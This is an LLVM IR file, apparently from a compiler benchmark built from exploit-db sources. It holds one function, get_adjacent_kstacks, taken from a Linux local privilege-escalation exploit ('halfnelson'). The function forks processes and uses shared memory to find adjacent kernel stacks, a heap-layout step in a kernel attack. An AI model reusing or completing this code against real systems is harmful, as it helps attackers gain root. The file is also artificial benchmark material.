; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_get_adjacent_kstacks.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_get_adjacent_kstacks.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64*, i8* }

@.str = private unnamed_addr constant [12 x i8] c"/halfnelson\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@S_IRWXU = common dso_local global i32 0, align 4
@S_IRWXG = common dso_local global i32 0, align 4
@S_IRWXO = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [46 x i8] c"[-] failed creating shared memory, aborting!\0A\00", align 1
@.str.2 = private unnamed_addr constant [46 x i8] c"[-] failed resizing shared memory, aborting!\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@region = common dso_local global %struct.TYPE_4__* null, align 8
@KSTACK_UNINIT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [34 x i8] c"[+] found parent kstack at 0x%lx\0A\00", align 1
@NPROC = common dso_local global i32 0, align 4
@KSTACK_PARENT = common dso_local global i32 0, align 4
@KSTACK_DIE = common dso_local global i64 0, align 8
@KSTACK_UPPER = common dso_local global i32 0, align 4
@KSTACK_LOWER = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [28 x i8] c"[-] fork failed, aborting!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @get_adjacent_kstacks() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @O_RDWR, align 4
  %7 = load i32, i32* @O_CREAT, align 4
  %8 = or i32 %6, %7
  %9 = load i32, i32* @S_IRWXU, align 4
  %10 = load i32, i32* @S_IRWXG, align 4
  %11 = or i32 %9, %10
  %12 = load i32, i32* @S_IRWXO, align 4
  %13 = or i32 %11, %12
  %14 = call i32 @shm_open(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32 %8, i32 %13)
  store i32 %14, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = icmp slt i32 %15, 0
  br i1 %16, label %17, label %20

17:                                               ; preds = %0
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %0
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @ftruncate(i32 %21, i32 4)
  store i32 %22, i32* %2, align 4
  %23 = load i32, i32* %2, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %20
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0))
  %27 = call i32 @exit(i32 1) #3
  unreachable

28:                                               ; preds = %20
  %29 = load i32, i32* @PROT_READ, align 4
  %30 = load i32, i32* @PROT_WRITE, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @MAP_SHARED, align 4
  %33 = load i32, i32* %3, align 4
  %34 = call %struct.TYPE_4__* @mmap(i32* null, i32 4, i32 %31, i32 %32, i32 %33, i32 0)
  store %struct.TYPE_4__* %34, %struct.TYPE_4__** @region, align 8
  %35 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %36 = load i32, i32* @KSTACK_UNINIT, align 4
  %37 = call i32 @memset(%struct.TYPE_4__* %35, i32 %36, i32 4)
  %38 = call i8* (...) @get_kstack()
  %39 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %40 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %39, i32 0, i32 1
  store i8* %38, i8** %40, align 8
  %41 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %42 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %41, i32 0, i32 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i8* %43)
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %113, %28
  %46 = load i32, i32* %1, align 4
  %47 = load i32, i32* @NPROC, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %116

49:                                               ; preds = %45
  %50 = call i32 (...) @fork()
  store i32 %50, i32* %4, align 4
  %51 = load i32, i32* %4, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %55

53:                                               ; preds = %49
  %54 = load i32, i32* @KSTACK_PARENT, align 4
  store i32 %54, i32* %5, align 4
  br label %113

55:                                               ; preds = %49
  %56 = load i32, i32* %4, align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %110

58:                                               ; preds = %55
  %59 = call i8* (...) @get_kstack()
  %60 = ptrtoint i8* %59 to i64
  %61 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %62 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %61, i32 0, i32 0
  %63 = load i64*, i64** %62, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i64, i64* %63, i64 %65
  store i64 %60, i64* %66, align 8
  br label %67

67:                                               ; preds = %58, %108
  %68 = call i32 @sleep(i32 1)
  %69 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %70 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %69, i32 0, i32 0
  %71 = load i64*, i64** %70, align 8
  %72 = load i32, i32* %1, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i64, i64* %71, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = load i64, i64* @KSTACK_DIE, align 8
  %77 = icmp eq i64 %75, %76
  br i1 %77, label %78, label %80

78:                                               ; preds = %67
  %79 = call i32 @exit(i32 0) #3
  unreachable

80:                                               ; preds = %67
  %81 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %82 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %81, i32 0, i32 0
  %83 = load i64*, i64** %82, align 8
  %84 = load i32, i32* %1, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i64, i64* %83, i64 %85
  %87 = load i64, i64* %86, align 8
  %88 = load i32, i32* @KSTACK_UPPER, align 4
  %89 = sext i32 %88 to i64
  %90 = icmp eq i64 %87, %89
  br i1 %90, label %91, label %93

91:                                               ; preds = %80
  %92 = load i32, i32* @KSTACK_UPPER, align 4
  store i32 %92, i32* %5, align 4
  br label %109

93:                                               ; preds = %80
  %94 = load %struct.TYPE_4__*, %struct.TYPE_4__** @region, align 8
  %95 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %94, i32 0, i32 0
  %96 = load i64*, i64** %95, align 8
  %97 = load i32, i32* %1, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i64, i64* %96, i64 %98
  %100 = load i64, i64* %99, align 8
  %101 = load i32, i32* @KSTACK_LOWER, align 4
  %102 = sext i32 %101 to i64
  %103 = icmp eq i64 %100, %102
  br i1 %103, label %104, label %106

104:                                              ; preds = %93
  %105 = load i32, i32* @KSTACK_LOWER, align 4
  store i32 %105, i32* %5, align 4
  br label %109

106:                                              ; preds = %93
  br label %107

107:                                              ; preds = %106
  br label %108

108:                                              ; preds = %107
  br label %67

109:                                              ; preds = %104, %91
  br label %116

110:                                              ; preds = %55
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  %112 = call i32 @exit(i32 1) #3
  unreachable

113:                                              ; preds = %53
  %114 = load i32, i32* %1, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %1, align 4
  br label %45

116:                                              ; preds = %109, %45
  %117 = load i32, i32* %5, align 4
  ret i32 %117
}

declare dso_local i32 @shm_open(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ftruncate(i32, i32) #1

declare dso_local %struct.TYPE_4__* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(%struct.TYPE_4__*, i32, i32) #1

declare dso_local i8* @get_kstack(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
